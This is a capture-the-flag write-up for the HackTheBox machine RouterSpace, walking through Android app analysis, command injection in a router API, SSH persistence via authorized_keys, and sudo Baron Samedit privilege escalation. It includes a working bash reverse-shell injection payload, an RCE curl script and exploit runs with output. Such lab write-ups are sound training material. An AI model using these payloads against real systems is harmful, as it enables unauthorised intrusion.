---
title: HTB: RouterSpace
url: https://0xdf.gitlab.io/2022/07/09/htb-routerspace.html
date: 2022-07-09T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: hackthebox, htb-routerspace, ctf, nmap, ubuntu, android, apk, feroxbuster, apktool, reverse-engineering, android-react-native, react-native, genymotion, burp, android-burp, command-injection, linpeas, pwnkit, cve-2021-4034, polkit, cve-2021-3560, cve-2021-22555, baron-samedit, cve2021-3156, htb-paper
---

![RouterSpace](https://0xdfimages.gitlab.io/img/routerspace-cover.png)

RouterSpace was all about dynamic analysis of an Android application. Unfortunately, it was a bit tricky to get setup and working. I’ll use a system-wide proxy on the virtualized Android device to route traffic through Burp, identifying the API endpoint and finding a command injection. For root, I’ll exploit the Baron Samedit vulnerability in sudo that came our in early 2021.

## Box Info

| Name | [RouterSpace](https://hackthebox.com/machines/routerspace)  [RouterSpace](https://hackthebox.com/machines/routerspace) [Play on HackTheBox](https://hackthebox.com/machines/routerspace) |
| --- | --- |
| Release Date | [26 Feb 2022](https://twitter.com/hackthebox_eu/status/1496515400850411526) |
| Retire Date | 09 Jul 2022 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for RouterSpace |
| Radar Graph | Radar chart for RouterSpace |
| First Blood User | 00:19:37[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| First Blood Root | 00:37:02[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creator | [h4rithd h4rithd](https://app.hackthebox.com/users/550483) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.148
Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-08 21:17 UTC
Nmap scan report for 10.10.11.148
Host is up (0.092s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.54 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.148
Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-08 21:19 UTC
Nmap scan report for 10.10.11.148
Host is up (0.090s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-RouterSpace Packet Filtering V1
80/tcp open  http
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-76575
...[snip]...
|_    Connection: close
|_http-title: RouterSpace
|_http-trane-info: Problem with XML parsing of /evox/about
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.80%I=7%D=6/8%Time=62A11250%P=x86_64-pc-linux-gnu%r(NULL,
SF:29,"SSH-2\.0-RouterSpace\x20Packet\x20Filtering\x20V1\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.80%I=7%D=6/8%Time=62A11250%P=x86_64-pc-linux-gnu%r(GetRe
...[snip]...
SF:b\x20sVkSPC6\x20\x20}\n\n\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.07 seconds

```

Neither the SSH nor the HTTP server versions are recognized. The HTTP response is returning an odd `X-POWERED-BY` header, which I’ll look at in a bit.

### Website - TCP 80

#### Site

The site is for a company the sells some kind of mobile app:

[![image-20220608173116399](https://0xdfimages.gitlab.io/img/image-20220608173116399.png)](https://0xdfimages.gitlab.io/img/image-20220608173116399.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220608173116399.png)

The only link on the page that does anywhere else is the “Download” button at the top right. Clicking it downloads `RouterSpace.apk`.

#### Tech Stack

The HTTP response headers are unusual:

```

HTTP/1.1 200 OK
X-Powered-By: RouterSpace
X-Cdn: RouterSpace-16098
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT
ETag: W/"652c-17d476c9285"
Content-Type: text/html; charset=UTF-8
Content-Length: 25900
Date: Wed, 08 Jun 2022 21:30:23 GMT
Connection: close

```

The `X-POWERED-BY` and `X-Cdn` headers are unique, and searching for those strings doesn’t turn up much.

The main page loads as `index.html`, so it seems like just a static site.

#### Directory Brute Force

The site is configured to send a 200 response for any request, where a 404 would be typical. `feroxbuster` recognizes the wildcard response, but then proceeds to show me every response anyway (it typically tried to filter responses that match the known bad path, in this case `http://10.10.11.148/3cf12bfdd9d5407e9fc85a543c748e57c59cdf1e802b477e8c07380471f224d386c56718c2014ae8b650902e7c842387`):

```

oxdf@hacky$ feroxbuster -u http://10.10.11.148

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.148
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt       
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
WLD      GET        1l       14w       71c Got 200 for http://10.10.11.148/221545c898f246d69d9e55467bd19c5c (url length: 32)
WLD      GET        5l       12w       73c Got 200 for http://10.10.11.148/3cf12bfdd9d5407e9fc85a543c748e57c59cdf1e802b477e8c07380471f224d386c56718c2014ae8b650902e7c842387 (url length: 96)                       
200      GET        3l       12w       73c http://10.10.11.148/images
200      GET        1l       12w       70c http://10.10.11.148/cgi-bin
200      GET        6l       14w       74c http://10.10.11.148/admin                 
301      GET       10l       16w      171c http://10.10.11.148/js => /js/         
200      GET        6l       12w       76c http://10.10.11.148/scripts      
200      GET        6l       13w       76c http://10.10.11.148/includes
200      GET        1l       11w       65c http://10.10.11.148/search  
...[snip]...

```

It seems that the length of the response is changing for each request. I’ll try one of these manually:

![](https://0xdfimages.gitlab.io/img/image-20220608173659192.png)

On refresh of the same URL, it’s different:

![image-20220608173720963](https://0xdfimages.gitlab.io/img/image-20220608173720963.png)

The “RequestID” seems to change randomly, which I suspect is why `feroxbuster` is having a hard time filtering it out.

I can filter out these responses using `-X [pattern]`, which will remove anything that matches `pattern` in the response body:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.148 -X 'Suspicious activity detected !!!'

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.148
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💢  Regex Filter          │ Suspicious activity detected !!!
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET       10l       16w      173c http://10.10.11.148/css => /css/
301      GET       10l       16w      173c http://10.10.11.148/img => /img/
200      GET      536l     1382w    25900c http://10.10.11.148/
301      GET       10l       16w      171c http://10.10.11.148/js => /js/
301      GET       10l       16w      177c http://10.10.11.148/fonts => /fonts/
301      GET       10l       16w      187c http://10.10.11.148/img/banner => /img/banner/
301      GET       10l       16w      183c http://10.10.11.148/img/icon => /img/icon/
301      GET       10l       16w      185c http://10.10.11.148/js/vendor => /js/vendor/
[####################] - 1m    270000/270000  0s      found:8       errors:0      
[####################] - 1m     30000/30000   377/s   http://10.10.11.148 
[####################] - 1m     30000/30000   378/s   http://10.10.11.148/css 
[####################] - 1m     30000/30000   378/s   http://10.10.11.148/img 
[####################] - 1m     30000/30000   378/s   http://10.10.11.148/ 
[####################] - 1m     30000/30000   378/s   http://10.10.11.148/js 
[####################] - 1m     30000/30000   379/s   http://10.10.11.148/fonts 
[####################] - 1m     30000/30000   379/s   http://10.10.11.148/img/banner 
[####################] - 1m     30000/30000   379/s   http://10.10.11.148/img/icon 
[####################] - 1m     30000/30000   380/s   http://10.10.11.148/js/vendor 

```

Nothing interesting here, but good to know that `-X` flag works.

## Shell as paul

### RouterSpace.apk - Static

#### Install apktool

To look at the application, I’ll use `apktool`, from [ibotpeaches](https://ibotpeaches.github.io/Apktool/). The [install instructions](https://ibotpeaches.github.io/Apktool/install/) show a manual download and install, but I’m also able to `apt install apktool`.

#### Unpack APK

An APK is an [Android Package](https://en.wikipedia.org/wiki/Apk_(file_format)) file, to be loaded onto Android mobile devices. Typically they are written in Java, but also support [Kotlin](https://en.wikipedia.org/wiki/Kotlin_(programming_language)). APKs are archive files, which means that they are really just a zip-like container with a bunch of other files in them.

To extract the source, I’ll run `apktool d RouterSpace.apk`:

```

oxdf@hacky$ apktool d RouterSpace.apk 
I: Using Apktool 2.4.0-dirty on RouterSpace.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/oxdf/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...

```

This generates a bunch of new files/directories:

```

oxdf@hacky$ ls -l RouterSpace/
total 36
-rwxrwx--- 1 root vboxsf 1148 Jun  8 21:56 AndroidManifest.xml
-rwxrwx--- 1 root vboxsf 3751 Jun  8 21:56 apktool.yml
drwxrwx--- 1 root vboxsf 4096 Jun  8 21:56 assets
drwxrwx--- 1 root vboxsf 4096 Jun  8 21:56 kotlin
drwxrwx--- 1 root vboxsf 4096 Jun  8 21:56 lib
drwxrwx--- 1 root vboxsf 4096 Jun  8 21:56 original
drwxrwx--- 1 root vboxsf 4096 Jun  8 21:56 res
drwxrwx--- 1 root vboxsf 4096 Jun  8 21:56 smali
drwxrwx--- 1 root vboxsf 4096 Jun  8 21:56 unknown

```

#### Static Analayis

Not necessary for solving RouterSpace, but some poking around will find a certificate at `original/META-INF/CERT.RSA`. It’s not necessary to find this, but it does give a domain name of `routerspace.htb`:

```

oxdf@hacky$ strings original/META-INF/CERT.RSA
Colombo1
Colombo1
routerspace.htb1
routerspace1
routerspce0
...[snip]...

```

I guess the domain could be `routerspace.htb1`, but it seems more likely that there just happens to be an 0x31 byte following the string in the certificate.

At the root of the application is `AndroidManifest.xml`, which (from the [Android docs](https://developer.android.com/guide/topics/manifest/manifest-intro)):

> describes essential information about your app to the Android build tools, the Android operating system, and Google Play.

The `<activity>` [tag](https://developer.android.com/guide/topics/manifest/activity-element):

> Declares an activity (an `Activity` subclass) that implements part of the application’s visual user interface. All activities must be represented by `<activity>` elements in the manifest file. Any that are not declared there will not be seen by the system and will never be run.

The `android:name` attribute within the `<activity>` tag specifies the name of the class that implements that activity.

For RouterSpace the `AndroidManifest.xml` file is:

```

<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="30" android:compileSdkVersionCodename="11" package="com.routerspace" platformBuildVersionCode="30" platformBuildVersionName="11">
    <uses-permission android:name="android.permission.INTERNET"/>
    <application android:allowBackup="false" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:icon="@mipmap/ic_launcher" android:label="@string/app_name" android:name="com.routerspace.MainApplication" android:roundIcon="@mipmap/ic_launcher" android:theme="@style/AppTheme">
        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenSize|uiMode" android:label="@string/app_name" android:launchMode="singleTask" android:name="com.routerspace.MainActivity" android:windowSoftInputMode="adjustResize">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>

```

So “com.routerspace.MainActivity” seems like a good place to start. `.smali` files are kind of like assembly language, still in text, but much lower level than the Java it’s compiled from. For details, check out the [smali wiki](https://github.com/JesusFreke/smali/wiki).

Typically I would be doing to something like [JD-GUI](http://java-decompiler.github.io/) for Java reverse engineering, but I’ll take a quick look at the file, and it’s quite short:

```

.class public Lcom/routerspace/MainActivity;
.super Lcom/facebook/react/ReactActivity;
.source "MainActivity.java"

# direct methods
.method public constructor <init>()V
    .locals 0

    .line 5
    invoke-direct {p0}, Lcom/facebook/react/ReactActivity;-><init>()V

    return-void
.end method

# virtual methods
.method protected getMainComponentName()Ljava/lang/String;
    .locals 1

    const-string v0, "RouterSpace"

    return-object v0
.end method

```

There are two methods. `getMainComponentName` is simple enough, returning “RouterSpace”. The other, the constructor, just has an `invoke-direct` call to `com/facebook/react/ReactActivity`.

#### React Native

Some Googling around for this will turn up [references](https://stackoverflow.com/questions/35017952/where-is-reactinstancemanager-in-my-mainactivity-java-file) to [React Native](https://reactnative.dev/), a framework for creating Android and iOS applications in JavaScript.

[This post](https://infosecwriteups.com/lets-know-how-i-have-explored-the-buried-secrets-in-react-native-application-6236728198f7) talks about reverse engineering React Native applications, and leads to the `assets/index.android.bundle` where the JavaScript is. In this case, it’s a heavily obfuscated mess, 740 lines that look like this (five lines shown):

[![image-20220609083424162](https://0xdfimages.gitlab.io/img/image-20220609083424162.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220609083424162.png)

### RouterSpace.apk - Dynamic

#### Background / Failures

The goal here is to set up an emulator and proxy the application traffic through Burp or watch it in Wireshark to see how it communicates with the RouterSpace host.

Getting this all set up was by far the hardest part of this box, and having read all the box reviews, what people really didn’t like about the box. I tried a bunch of emulators / configurations that didn’t work. I was never able to get Android Studio’s emulator to completely work. I could get a system up and running, and get the APK installed. I could get web traffic routed through Burp, but the application would fail to connect and I wouldn’t see any traffic. If anyone does find a detailed writeup getting it working in Android Studio, I’d love to see it (message me on Twitter or Discord).

The other issue that was hard to figure out is that something changed in Android API version 28 where the application from RouterSpace won’t use the proxy even if it’s defined system-wide. I can’t explain this. I looked at the [Changelog](https://developer.android.com/about/versions/pie/android-9.0-changes-28) and couldn’t see any specific reason why it might break. It *could* be something to do with forcing TLS and not trusting the Burp certificate, but when I open Wireshark in my VM, I don’t even see the traffic getting to TCP 8080 to see that the cert isn’t trusted.

#### Target Configuration

I did get it working with [Genymotion](https://www.genymotion.com/) using API version 27 or lower. I’ll need an account to use it, but it is free for personal use. Genymotion requires VirtualBox (which I’m already using), and the setup will look like this:

![image-20220625134835319](https://0xdfimages.gitlab.io/img/image-20220625134835319.png)

When the android VM wants to send a request, it will go through the proxy on the hacking VM. There, it will resolve DNS (if necessary), and connect to the target. Because my VPN is connected to HTB in the VM, the and the proxy is the one making the request, I don’t have to worry about connecting the VPN from the Android VM (as long as the traffic is going through the proxy).

#### Setup Genymotion

With Genymotion installed, I’ll open it and click on the `+` button at the top right:

![image-20220625131252277](https://0xdfimages.gitlab.io/img/image-20220625131252277.png)

I’ll select a phone with API 27 and click next:

![image-20220625131411335](https://0xdfimages.gitlab.io/img/image-20220625131411335.png)

On the next screen, I’ll name it something I’ll recognize, and click install:

![image-20220625131458403](https://0xdfimages.gitlab.io/img/image-20220625131458403.png)

It takes a minute to build the VM, and then it pops a message saying it’s ready:

![image-20220625131526640](https://0xdfimages.gitlab.io/img/image-20220625131526640.png)

Clicking “START” opens the phone:

![image-20220625131633896](https://0xdfimages.gitlab.io/img/image-20220625131633896.png)

#### Configure Proxy

I’ll drag down from the top of the phone and click the gear icon:

![image-20220625131744560](https://0xdfimages.gitlab.io/img/image-20220625131744560.png)

I’ll click “Network & Internet”, “Wi-Fi”, and then click and hold on “AndroidWifi” until the menu comes up:

![image-20220625131838468](https://0xdfimages.gitlab.io/img/image-20220625131838468.png)

“Modify network” pops a small menu, and after expanding “Advanced options”, I’ll switch “Proxy” from “None” to manual and set it to the IP/port of my hacking VM where Burp is running:

![image-20220625131951545](https://0xdfimages.gitlab.io/img/image-20220625131951545.png)

I’ll use 10.1.1.164, which is the IP of my VM on the same network as my host (using bridged routing in VirtualBox).

On my VM, I’ll need to configure Burp to listen on all interfaces, rather than the typical localhost. Under “Proxy” > “Options” > “Proxy Listeners” I’ll select the running listener and click “Edit”. I’ll change the “Bind to address” to “All interfaces”:

![image-20220625132158332](https://0xdfimages.gitlab.io/img/image-20220625132158332.png)

After clicking ok and ok again to accept the risk, it’s listening.

#### Test Proxy

To see if the proxy is working, I’ll open the web browser, which is this icon:

![image-20220625133037530](https://0xdfimages.gitlab.io/img/image-20220625133037530.png)

Visiting 10.10.11.148 loads:

![image-20220625135132616](https://0xdfimages.gitlab.io/img/image-20220625135132616.png)

And there’s traffic in Burp:

[![image-20220625135150546](https://0xdfimages.gitlab.io/img/image-20220625135150546.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220625135150546.png)

Also worth noting, if I put a bogus domain in, it goes to Burp to figure out it doesn’t know the host:

![image-20220625154958054](https://0xdfimages.gitlab.io/img/image-20220625154958054.png)

And that request is there in Burp, with no response:

![image-20220625155031935](https://0xdfimages.gitlab.io/img/image-20220625155031935.png)

If I add 0xdf.htb to my `hosts` file (say, pointing at 10.10.11.148), then it works:

![image-20220625155121846](https://0xdfimages.gitlab.io/img/image-20220625155121846.png)

I’m intentionally not using `routerspace.htb` here because I haven’t seen any indication of what domain name this site might use, and it’s risky to just assume it’s `[boxname].htb`.

#### Install RouterSpace.apk

To install, it’s as easy as finding the `.apk` file in a file explorer and dragging it onto the Android VM:

![image-20220625155810121](https://0xdfimages.gitlab.io/img/image-20220625155810121.png)

One letting go of the mouse, it installs, and opens to some welcome screens:

![image-20220625160203756](https://0xdfimages.gitlab.io/img/image-20220625160203756.png)

#### Intercept Request

After a couple clicks through initial pages, there’s a simple image with a “Check Status” button:

![image-20220625155912567](https://0xdfimages.gitlab.io/img/image-20220625155912567.png)

I’ll turn on Intercept in Burp, and click “Check Status”, and there’s a request:

![image-20220625160020139](https://0xdfimages.gitlab.io/img/image-20220625160020139.png)

It actually says “[unknown host]” at the top there because it isn’t able to resolve DNS for `routerspace.htb`. I’ll add this to `/etc/hosts`, and intercept another request, and it’s updated:

![image-20220625160312118](https://0xdfimages.gitlab.io/img/image-20220625160312118.png)

I’ll send this to Repeater and send it to see the response:

![image-20220625160356851](https://0xdfimages.gitlab.io/img/image-20220625160356851.png)

### RCE in Endpoint

#### Understand Endpoint

The endpoint takes an IP address and seems to return that IP. If I change it, the new IP comes back as a string:

![image-20220625161323659](https://0xdfimages.gitlab.io/img/image-20220625161323659.png)

I’ll start WireShark and give it my IP, but nothing interesting happens.

If I try something that isn’t a valid IP, it comes back just the same:

![image-20220625161406113](https://0xdfimages.gitlab.io/img/image-20220625161406113.png)

It seems almost like it’s just an echo endpoint. Presumably it’s doing something with the IP on the server.

I’ll also note that the `User-Agent` string is interesting. If I change it in any way, the server complains:

![image-20220625161534613](https://0xdfimages.gitlab.io/img/image-20220625161534613.png)

#### Command Injection

On the assumption that something is being done with this given IP address, I’ll try adding command injection to the parameters, and it works:

![image-20220625161907017](https://0xdfimages.gitlab.io/img/image-20220625161907017.png)

#### Shell - Fail

My initial thought is to get a reverse shell. I’ll try my favorite [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw), but it just hangs, with no contact at my waiting `nc`:

![image-20220625162249703](https://0xdfimages.gitlab.io/img/image-20220625162249703.png)

This is indicative of a firewall blocking outbound. `which nc` shows that `nc` is on the box, so I’ll try a simple `nc 10.10.14.6 443`, and it hangs as well.

#### Shell - Unintened Success via IPv6

There’s an unintended bypass here that IppSec pointed out - The firewall is only blocking IPv4. So it’s possible to get a shell using IPv6 with a payload like:

```

{"ip": "$(bash -c 'bash -i >& /dev/tcp/dead:beef:2::1004/443 0>&1')"}

```

I’ll use `ncat` to listen on IPv6 using the `-6` flag:

```

oxdf@hacky$ ncat -6lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Connection from dead:beef::250:56ff:feb9:c742.
Ncat: Connection from dead:beef::250:56ff:feb9:c742:41884.
bash: cannot set terminal process group (913): Inappropriate ioctl for device
bash: no job control in this shell
paul@routerspace:/opt/www/public/routerspace$

```

### Enumerate Host

#### Generate Bash Script

Proceeding without the unintended reverse shell, I’ll take this POST request and generate a `curl` command I can use to make enumeration easier. I like to then put it into a short `bash` script so I can just up arrow, and change the command, and re-run. The script looks like:

```

#!/bin/bash

curl -s -x http://127.0.0.1:8080 \
        -H 'user-agent: RouterSpaceAgent' \
        -H 'Content-Type: application/json' \
        -d '{"ip":"$('"$1"')"}' \
        http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess \
        | jq -r .

```

There’s two tricks in there. First, in order to get `$1` to expand to the passed in argument, I’ll need to close the single quote string, put it in double quotes, and then start the single quote string again (`bash` is a headache like that).

I’m also using `jq` with `-r` to print the raw string, which removes the `""` around the result and the trailing `\n`. `jq` is made for JSON, but technically a string is valid JSON, so it works. It doesn’t help fix the fact that the server seems to strip out new lines in the middle of results, so that’s still a mess.

The script runs as hoped:

```

oxdf@hacky$ ./rce.sh 'id'
uid=1001(paul) gid=1001(paul) groups=1001(paul)

```

I’ll find `user.txt` in paul’s home dir:

```

oxdf@hacky$ ./rce.sh 'ls /home/paul'
snap user.txt

```

The multiline result is a mess:

```

oxdf@hacky$ ./rce.sh 'ls -l /home/paul'
total 8 drwxr-xr-x 3 paul paul 4096 Feb 17 18:30 snap -r--r----- 1 root paul 33 Jun 19 21:13 user.txt

```

Anyway, I can read the flag:

```

oxdf@hacky$ ./rce.sh 'cat /home/paul/user.txt'
db87a6d1************************

```

#### .ssh

paul’s homedir does have a `.ssh` directory:

```

oxdf@hacky$ ./rce.sh 'ls -a /home/paul'
. .. .bash_history .bash_logout .bashrc .cache .gnupg .local .pm2 .profile snap .ssh user.txt

```

It’s empty:

```

oxdf@hacky$ ./rce.sh 'ls -a /home/paul/.ssh'
. ..

```

I’ll try adding my public key to an `authorized_keys` file:

```

oxdf@hacky$ ./rce.sh 'echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> /home/paul/.ssh/authorized_keys'
parse error: Invalid numeric literal at line 1, column 10

```

If I check Burp, the request looks like this, and I can see the `"` are messing things up:

![image-20220625171627925](https://0xdfimages.gitlab.io/img/image-20220625171627925.png)

Sending again with the `"` escaped solves it:

```

oxdf@hacky$ ./rce.sh 'echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing\" >> /home/paul/.ssh/authorized_keys'

```

### SSH

I can connect as paul:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen paul@10.10.11.148
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)
...[snip]...
Last login: Sat Nov 20 18:30:35 2021 from 192.168.150.133
paul@routerspace:~$ 

```

## Shell as root

### Enumeration

#### Manual

There’s not much of interesting in paul’s home directory, and paul is the only home directory in `/home`.

`/opt/www/public/routerspace` has the web server. It’s an unusual space, but not much interesting there.

Looking around, I don’t see much else that could be useful.

#### LinPEAS

At this point, I’ll upload [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS). I’ll grab the latest `linpeas.sh` from the [release page](https://github.com/carlospolop/PEASS-ng/releases/tag/20220619) (it’s always nice to grab the latest, as this thing updates all the time - as I’m solving, it was last updated 7 days ago).

With a copy on my VM, I’ll use `scp` to get it onto RouterSpace (other options like fetching it from a webserver are blocked by the firewall):

```

oxdf@hacky$ scp -i ~/keys/ed25519_gen linpeas.sh paul@routerspace.htb:/dev/shm
Warning: Permanently added 'routerspace.htb' (ECDSA) to the list of known hosts.
linpeas.sh                          100%  759KB 954.4KB/s   00:00 

```

`bash /dev/shm/linpeas.sh` will run it. There’s a ton of output, so I’ll just highlight the interesting bits.

Right at the top, there’s a yellow with red text (high confidence privilege escalation (PE) vector) in the “System Information”:

[![image-20220625173638292](https://0xdfimages.gitlab.io/img/image-20220625173638292.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220625173638292.png)

A bit further down, the Linux Exploit Suggester finds more:

[![image-20220625174232961](https://0xdfimages.gitlab.io/img/image-20220625174232961.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220625174232961.png)

There’s a bunch more good enumeration stuff in the output, but given some solid leads on exploits, I’ll run those down first.

CVE-2017-5618 relies on a SetUID `screen` binary, which I wasn’t able to find on RouterSpace, so that looks like a false positive.

### Failed Exploits

#### PwnKit

Just like in [Paper](/2022/06/18/htb-paper.html#pwnkit---fail), the box reports to be vulnerable to CVE-2021-4034, otherwise known as [PwnKit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034). However, to be vulnerable, `pkexec` must be running SetUID as root. It is not here:

```

paul@routerspace:/dev/shm$ which pkexec
/usr/bin/pkexec
paul@routerspace:/dev/shm$ ls -l /usr/bin/pkexec 
-rwxr-xr-x 1 root root 31032 May 26  2021 /usr/bin/pkexec

```

So this is a false positive.

#### PolKit Vuln

In [Paper](/2022/06/18/htb-paper.html#polkit-cve), CVE-2021-3560 was the intended solution. I’ll use the [same POC](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation) here, but it fails:

```

paul@routerspace:/dev/shm$ bash cve-2021-3560.sh 

[!] Username set as : secnigma
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as ubuntu
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[x] ERROR: Accounts service and Gnome-Control-Center NOT found!!
[!]  Aborting Execution!

```

That POC works by adding a new user in the `sudo` group, and it’s failing because it uses the `Accountsservice` and `Gnome-Control-Center` to do that. Because that is core to [how the exploit functions](https://www.hackingarticles.in/linux-privilege-escalation-polkit-cve-2021-3560/) , there’s not much I can do here.

#### NetFilter

The vulnerability in NetFilter, CVE-2021-22555, says it requires the `ip_tables` kernel module to be loaded. That is actually present here:

```

paul@routerspace:/dev/shm$ lsmod | grep ip_tables
ip_tables              32768  9 iptable_filter
x_tables               40960  11 ip6table_filter,xt_conntrack,iptable_filter,xt_LOG,xt_tcpudp,xt_addrtype,ip6_tables,ipt_REJECT,ip_tables,xt_limit,xt_NFQUEUE

```

I’ll download the POC from the link in the LinPeas output, and compile it and `scp` it to RouterSpace:

```

oxdf@hacky$ gcc -m32 -static -o cve-2021-22555 cve-2021-22555.c oxdf@hacky$ scp -i ~/keys/ed25519_gen cve-2021-22555 paul@routerspace.htb:/dev/shm/
cve-2021-22555                  100%  706KB 879.9KB/s   00:00

```

I’ll run it a couple times, but it fails the same way each time:

```

paul@routerspace:/dev/shm$ ./cve-2021-22555
[+] Linux Privilege Escalation by theflow@ - 2021

[+] STAGE 0: Initialization
[*] Setting up namespace sandbox...
[*] Initializing sockets and message queues...

[+] STAGE 1: Memory corruption
[*] Spraying primary messages...
[*] Spraying secondary messages...
[*] Creating holes in primary messages...
[*] Triggering out-of-bounds write...
[*] Searching for corrupted primary message...
[-] Error could not corrupt any primary message.

```

### Baron Samedit

#### Background

It’s not really clear to me what the difference is between “sudo Baron Samedit” and “sudo Baron Samedit 2” (they both have the same details link, though there are two different POCs - it could just be two different POCs):

```

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt 
   Exposure: probable                              
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main             

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt 
   Exposure: probable                              
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

```

[This post](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt) from Qualys gives all the details. It’s a heap-based buffer overflow, which means the details are way beyond what’s needed to complete an easy box. It’s enough to know that buffer overflows often lead to command execution, and this is in a process running as root.

#### Check Vulnerability

[This repo](https://github.com/CptGibbon/CVE-2021-3156) gives a nice check for vulnerability (in addition to a POC), `sudoedit -s Y`. If it asks for a password, it’s probably vulnerable. If it prints help, then it’s patched.

Looks promising:

```

paul@routerspace:/dev/shm$ sudoedit -s Y
[sudo] password for paul:

```

#### Exploit

I’ll clone the repo to my host, and follow the instructions to build the binary:

```

oxdf@hacky$ git clone git@github.com:CptGibbon/CVE-2021-3156.git
Cloning into 'CVE-2021-3156'...
remote: Enumerating objects: 13, done.
remote: Counting objects: 100% (13/13), done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 13 (delta 1), reused 5 (delta 0), pack-reused 0
